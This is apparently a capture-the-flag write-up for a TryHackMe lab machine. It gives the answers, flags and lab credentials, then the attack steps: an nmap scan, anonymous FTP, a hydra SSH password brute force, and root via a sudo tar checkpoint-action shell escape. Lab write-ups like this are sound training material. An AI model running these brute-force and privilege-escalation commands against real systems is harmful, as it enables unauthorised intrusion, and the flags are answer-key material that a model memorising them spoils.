export IP=10.10.209.142


==================================================

[TASK 1] - Living up to the title.

1) Deploy the machine.

2) Find open ports on the machine.

3) Who wrote the task list?

	Answer: `lin`
	Notes: See approach step 2.

4) What service can you bruteforce with the text file found?

	Answer: `ssh`

5) What is the users password?

	Answer: `RedDr4gonSynd1cat3`
	Notes: See approach step 3.

6) user.txt

	Answer: `THM{CR1M3_SyNd1C4T3}`

7) root.txt

	Answer: `THM{80UN7Y_h4cK3r}`


==================================================

[IMPORTANT INFORMATION]

SSH username: lin
SSH password: RedDr4gonSynd1cat3

Gain root access through '/bin/tar' command: `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`


==================================================

[APPROACH]

1) Ran nmap scan:

	Command: `nmap -sV -sC -oN nmap/initial $IP`

2) Logged into FTP using anonymous. Downloaded two files: 'locks.txt' and 'task.txt'.

	Notes:
		- 'locks.txt' looks like a password file.
		- 'task.txt' contains a potential username: 'lin'

3) Brute forcing SSH using 'lin' as the username and the 'locks.txt' file as password wordlist.

	Command: `hydra -l lin -P FTP-anonymous/locks.txt -o ssh-password.txt $IP ssh`

4) Login to the server using SSH.

	Command: `ssh lin@$IP` + `RedDr4gonSynd1cat3`

5) Attempt priviledge escalation.

	Command: `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
	Notes:
		- Once logged in as 'lin', I ran the command: `sudo -l`. Found:
			> User lin may run the following commands on bountyhacker:
    			(root) /bin/tar
		- Searched GTFOBins for tar priv esc and found the above command.